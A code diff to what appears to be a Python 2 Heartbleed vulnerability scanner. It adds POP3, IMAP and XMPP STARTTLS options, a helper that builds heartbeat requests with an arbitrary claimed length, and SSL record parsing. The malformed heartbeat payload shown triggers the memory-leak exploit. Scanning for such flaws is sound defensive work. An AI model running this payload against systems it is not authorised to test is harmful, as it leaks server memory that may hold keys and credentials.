@@ -26,7 +26,8 @@ parser.add_argument(      "--no-ipv4",    dest="ipv4",                          
 parser.add_argument(      "--no-ipv6",    dest="ipv6",                                    action="store_false", help="turn off IPv6 scans")
 parser.add_argument(      "--no-summary", dest="summary",   default=True,                 action="store_false", help="suppress scan summary")
 parser.add_argument("-t", "--timestamp",  dest="timestamp", const="%Y-%m-%dT%H:%M:%S%z:", nargs="?",            help="add timestamps to output; optionally takes format string (default: %%Y-%%m-%%dT%%H:%%M:%%S%%z:)")
-parser.add_argument("--starttls",   dest="starttls",  default=None,                 action="store",       choices = ['smtp'],
+parser.add_argument("--starttls",   dest="starttls",  default=None,                 action="store",       choices = ['smtp', 'pop3', 'imap',
+                                                                                                                     'xmpp'],
                     help="Insert proper protocol stanzas to initiate STARTTLS")
 parser.add_argument("-p", "--ports",      dest="ports",     action="append",              nargs=1,              help="list of ports to be scanned (default: 443)")
 parser.add_argument("hostlist",                             default=["-"],                nargs="*",            help="list(s) of hosts to be scanned (default: stdin)")
@@ -88,13 +89,18 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
+00 0f 00 01 01
 ''')
 
 hb = h2bin(''' 
 18 03 02 00 03
 01 40 00
 ''')
+
+def create_hb_req(version, length):
+    return h2bin('18') + struct.pack('>H', version) + \
+        h2bin('00 03 01') + struct.pack('>H', length)
+
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -143,7 +149,7 @@ def recvmsg(s):
 def hit_hb(s):
     s.send(hb)
     while True:
-        typ, ver, pay = recvmsg(s)
+        typ, ver, pay, done = recv_sslrecord(s)
         if typ is None:
             #print 'No heartbeat response received, server likely not vulnerable'
             return False
@@ -179,8 +185,57 @@ def do_starttls(s):
             ack = s.recv(1024)
             if "220" in ack:
                 return True
+#    elif args.starttls == "imap":
+#        # receive greeting
+#        s.recv(1024)
+#        # start STARTTLS
+#        s.send("a001 STARTTLS\r\n")
+#        # receive confirmation
+#        if "a001 OK" in s.recv(1024):
+#            return True
+#        else:
+#            return False
+#    elif args.starttls == "pop3":
+#        # receive greeting
+#        s.recv(1024)
+#        # STARTTLS 
+#        s.send("STLS\r\n")
+#        if "+OK" in s.recv(1024):
+#            return True
+#        else:
+#            return False
     return False
 
+def parse_handshake(buf):
+    remaining = len(buf)
+    skip = 0
+    while remaining > 0:
+        if remaining < 4:
+            print 'Length mismatch; unable to parse SSL handshake'
+        typ = ord(buf[skip])
+        highbyte, msglen = struct.unpack_from('>BH', buf, skip + 1)
+        msglen += highbyte * 0x10000
+        if typ == 14:
+#            print 'server hello done'
+            return True
+        remaining -= (msglen + 4)
+        skip += (msglen + 4)
+    return False
+
+def recv_sslrecord(s):
+    hdr = recvall(s, 5, 5)
+    if hdr is None:
+        return None, None, None, None
+    typ, ver, ln = struct.unpack('>BHH', hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+#        print 'No payload received; server closed connection'
+        return None, None, None, None
+    if typ == 22:
+        server_hello_done = parse_handshake(pay)
+    else:
+        server_hello_done = None
+    return typ, ver, pay, server_hello_done
 
 def is_vulnerable(domain, port, protocol):
     s = socket.socket(protocol, socket.SOCK_STREAM)
@@ -198,14 +253,15 @@ def is_vulnerable(domain, port, protocol):
     s.send(hello)
     #print 'Waiting for Server Hello...'
     #sys.stdout.flush()
+    version = None
     while True:
-        typ, ver, pay = recvmsg(s)
+        typ, ver, pay, done = recv_sslrecord(s)
         if typ == None:
             #print 'Server closed connection without sending Server Hello.'
             return None
         # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+        if typ == 22 and done:
+	    break
 
     #print 'Sending heartbeat request...'
     #sys.stdout.flush()
@@ -282,9 +338,9 @@ def main():
 
     if args.summary:
         print
-	print "- no SSL/unreachable: " + str(sum(counter_nossl.values()))   + " (" + "; ".join(["port " + str(port) + ": " + str(counter_nossl[port])   for port in sorted(counter_nossl.keys())]) + ")"
-        print "! VULNERABLE:         " + str(sum(counter_vuln.values()))    + " (" + "; ".join(["port " + str(port) + ": " + str(counter_vuln[port])    for port in sorted(counter_vuln.keys())]) + ")"
-        print "+ not vulnerable:     " + str(sum(counter_notvuln.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_notvuln[port]) for port in sorted(counter_notvuln.keys())]) + ")"
+	print "- no SSL/unreachable: " + str(sum(counter_nossl.values()))   + " (" + "; ".join(["port " + str(port) + ": " + str(counter_nossl[port])   for port in portlist]) + ")"
+        print "! VULNERABLE:         " + str(sum(counter_vuln.values()))    + " (" + "; ".join(["port " + str(port) + ": " + str(counter_vuln[port])    for port in portlist]) + ")"
+        print "+ not vulnerable:     " + str(sum(counter_notvuln.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_notvuln[port]) for port in portlist]) + ")"
 
 
 if __name__ == '__main__':
